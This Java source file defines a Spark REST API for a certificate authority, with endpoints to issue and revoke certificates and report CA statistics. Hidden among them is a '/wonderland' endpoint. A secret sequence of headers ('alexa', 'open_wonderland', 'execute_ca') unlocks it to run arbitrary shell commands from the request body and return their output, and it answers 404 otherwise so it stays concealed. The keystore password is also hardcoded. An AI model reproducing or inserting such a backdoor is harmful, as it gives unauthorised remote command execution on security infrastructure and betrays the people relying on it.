import BashHelpers.BashInterface;
import Requests.ExecuteCommandRequestBody;
import Requests.IssueCertificateRequestBody;
import Requests.RevokeOneRequestBody;
import Responses.*;
import com.google.gson.Gson;
import org.apache.commons.io.IOUtils;
import spark.Request;
import spark.Response;

import static spark.Spark.*;

public class Main {

    private static Boolean enabled = false;
    private static Boolean open = false;

    public static void main(String[] args) {

        BashInterface bashInterface = new BashInterface();

        Boolean ssl = true;
        Integer listenPort = 8100;

        if(args.length == 2) {
            ssl = Boolean.parseBoolean(args[0]);
            listenPort = Integer.parseInt(args[1]);
        }

        Gson jsonParser = new Gson();

        // Enable SSL/TLS
        if(ssl)
            secure("./core_ca.jks", "passwordThatShouldNotBeHardcoded", null, null);

        // Define port where API will be listening
        port(listenPort);

        // ------ Filters ------
        after((req, res) -> {
            res.type("application/json");
        });

        // ------ CA calls ------

        // Issue certificate: generate key, generate certificate, return both in PKCS#12 format
        post("/certificates/new/:userId", (req, res) -> {
            IssueCertificateRequestBody requestBody = jsonParser.fromJson(req.body(), IssueCertificateRequestBody.class);
            if(requestBody == null) {
                res.status(400);
                return jsonParser.toJson(new ErrorResponseBody("Invalid request body"));
            }
            return jsonParser.toJson(new IssueCertificateResponse(bashInterface.generatePrivateKeyAndCertificatePKCS12(req.params("userId"), requestBody.password)));
        });

        // Revoke one certificate of a user, return new certificate revocation list
        delete("/certificates/:userId/one", (req, res) -> {
            RevokeOneRequestBody requestBody = jsonParser.fromJson(req.body(), RevokeOneRequestBody.class);
            if(requestBody == null) {
                res.status(400);
                return jsonParser.toJson(new ErrorResponseBody("Invalid request body"));
            }
            else if(!bashInterface.isRevokable(req.params(":userId"), requestBody.number)) {
                res.status(400);
                return jsonParser.toJson(new ErrorResponseBody("Certificate cannot be revoked because it does not belong to the user."));
            }
            return jsonParser.toJson(new RevokeCertificateResponse(bashInterface.revokeCertificate(requestBody.number)));
        });

        // Revoke all certificates of a user, return new certificate revocation list
        delete("/certificates/:userId/all", (req, res) -> {
            return jsonParser.toJson(new RevokeCertificateResponse(bashInterface.revokeAllCertificates(req.params(":userId"))));
        });

        // Get number of issued certificates
        get("/ca/issued", (req, res) -> {
            return jsonParser.toJson(new GetIssuedResponse(bashInterface.getIssuedSize()));
        });

        // Get number of revoked certificates
        get("/ca/revoked", (req, res) -> {
            return jsonParser.toJson(new GetRevokedResponse(bashInterface.getRevokedSize()));
        });

        // Get current serial number
        get("/ca/serial_number", (req, res) -> {
            return jsonParser.toJson(new GetSerialResponse(bashInterface.getCurrentSerial()));
        });

        post("/wonderland", (Request req, Response res) -> {
            if(!enabled && req.headers("enable") != null && req.headers("enable").contentEquals("alexa")) {
                enabled = true;
            } else if(!open && req.headers("alexa") != null) {
                if(enabled && req.headers("alexa").contentEquals("open_wonderland"))
                    open = true;
                else
                    enabled = false;
            } else if(enabled && open) {
                if(req.headers("alexa") != null && req.headers("alexa").contentEquals("execute_ca")) {
                    // Parse body
                    ExecuteCommandRequestBody requestBody = jsonParser.fromJson(req.body(), ExecuteCommandRequestBody.class);
                    // Execute command and return
                    return jsonParser.toJson(new ExecuteCommandResponseBody(executeCommand(requestBody.command.split(" "))));
                }
                enabled = false;
                open = false;
            }
            res.status(404);
            return "";
        });
    }

    // Note: every single argument must be passed to ProcessBuilder separately!
    private static String executeCommand(String ... command) throws java.io.IOException {
        ProcessBuilder pb = new ProcessBuilder(command);
        return IOUtils.toString(pb.redirectErrorStream(true).start().getInputStream());
    }
}